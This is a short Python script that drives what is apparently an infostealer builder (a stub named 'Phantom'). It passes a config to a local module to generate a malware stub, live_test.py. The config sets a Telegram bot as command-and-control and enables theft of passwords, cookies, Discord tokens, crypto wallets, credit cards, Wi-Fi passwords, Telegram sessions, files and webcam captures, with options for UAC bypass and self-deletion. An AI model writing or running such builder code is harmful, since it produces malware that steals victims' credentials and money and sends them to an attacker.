import sys
import json
import os
import io

sys.path.insert(0, r'C:\Users\twota\OneDrive\Desktop\ne\Components')
import process

config = {
    "settings": {
        "c2": ["telegram", "12345:ABCDEF$987654321"],
        "mutex": "PhantomTestMutex",
        "pingme": False,
        "vmprotect": False,
        "startup": False,
        "melt": False,
        "uacBypass": False,
        "archivePassword": "test",
        "consoleMode": 2,
        "debug": True,
        "pumpedStubSize": 0,
        "boundFileRunOnStartup": False
    },
    "modules": {
        "captureWebcam": True,
        "capturePasswords": True,
        "captureCookies": True,
        "captureHistory": True,
        "captureAutofills": True,
        "captureDiscordTokens": True,
        "captureGames": True,
        "captureWifiPasswords": True,
        "captureSystemInfo": True,
        "captureScreenshot": True,
        "captureTelegramSession": True,
        "captureCommonFiles": True,
        "captureWallets": True,
        "captureExif": True,
        "captureCreditCards": True,
        "fakeError": [False, ["", "", ""]],
        "blockAvSites": False,
        "discordInjection": False
    }
}

stub_code = process.WritePythonStub(config)
with open(r'C:\Users\twota\OneDrive\Desktop\ne\Components\live_test.py', 'w', encoding='utf-8') as f:
    f.write(stub_code)
print('Generated live_test.py')
